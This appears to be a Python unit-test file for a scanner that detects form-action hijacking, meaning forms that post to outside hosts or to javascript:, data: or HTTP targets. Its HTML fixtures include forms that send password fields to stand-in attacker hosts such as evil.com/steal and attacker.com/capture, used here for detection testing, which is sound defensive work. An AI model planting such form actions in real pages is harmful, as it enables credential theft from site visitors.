"""Tests for FormActionHijackingScanner."""
import unittest
from unittest.mock import MagicMock, patch
from tblue.scanner.form_action_hijacking import FormActionHijackingScanner

URL = "https://example.com"


def _page(form_tag, inputs=""):
    return f"<html><body>{form_tag}{inputs}</body></html>"


class TestFormActionHijacking(unittest.TestCase):
    def _make(self):
        s = FormActionHijackingScanner.__new__(FormActionHijackingScanner)
        s.http = MagicMock()
        return s

    def _resp(self, body="", status=200, headers=None):
        r = MagicMock()
        r.status_code = status
        r.text = body
        r.headers = headers or {}
        return r

    # ── External domain — no sensitive inputs ─────────────────────────────────

    def test_form_external_action_warns(self):
        body = _page('<form action="https://evil.com/collect" method="POST">', '<input name="q">')
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns_or_fails = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("external" in r["type"].lower() for r in warns_or_fails))

    # ── External domain with password ─────────────────────────────────────────

    def test_form_external_with_password_fails(self):
        body = _page(
            '<form action="https://evil.com/steal" method="POST">',
            '<input type="password" name="pwd">'
        )
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        fails = [r for r in results if r["status"] == "FAIL"]
        self.assertTrue(any("sensitive" in r["type"].lower() or "external" in r["type"].lower() for r in fails))

    # ── Protocol-relative external ────────────────────────────────────────────

    def test_protocol_relative_external_warns(self):
        body = _page('<form action="//attacker.com/capture" method="POST">')
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns_or_fails = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(len(warns_or_fails) > 0)

    # ── javascript: action ────────────────────────────────────────────────────

    def test_javascript_action_warns(self):
        body = _page('<form action="javascript:void(0)" method="POST">')
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("javascript" in r["type"].lower() for r in warns))

    # ── data: URI action ──────────────────────────────────────────────────────

    def test_data_uri_action_warns(self):
        body = _page('<form action="data:text/html,<form>" method="POST">')
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("data" in r["type"].lower() for r in warns))

    # ── HTTP action on HTTPS page ─────────────────────────────────────────────

    def test_http_action_on_https_page_fails(self):
        body = _page('<form action="http://example.com/login" method="POST">')
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        fails = [r for r in results if r["status"] == "FAIL"]
        self.assertTrue(any("http" in r["type"].lower() or "mixed" in r["type"].lower() or "downgrade" in r["type"].lower() for r in fails))

    # ── Safe same-origin HTTPS ────────────────────────────────────────────────

    def test_same_origin_https_action_passes(self):
        body = _page('<form action="/login" method="POST">', '<input type="password" name="pwd">')
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        self.assertTrue(any(r["status"] == "PASS" for r in results))
        self.assertFalse(any(r["status"] == "FAIL" for r in results))

    # ── No forms ──────────────────────────────────────────────────────────────

    def test_no_forms_passes(self):
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body="<html><body>no forms here</body></html>")
            results = s.scan(URL)
        self.assertTrue(any(r["status"] == "PASS" for r in results))

    # ── No response ────────────────────────────────────────────────────────────

    def test_no_response_passes(self):
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = None
            results = s.scan(URL)
        self.assertTrue(any(r["status"] == "PASS" for r in results))
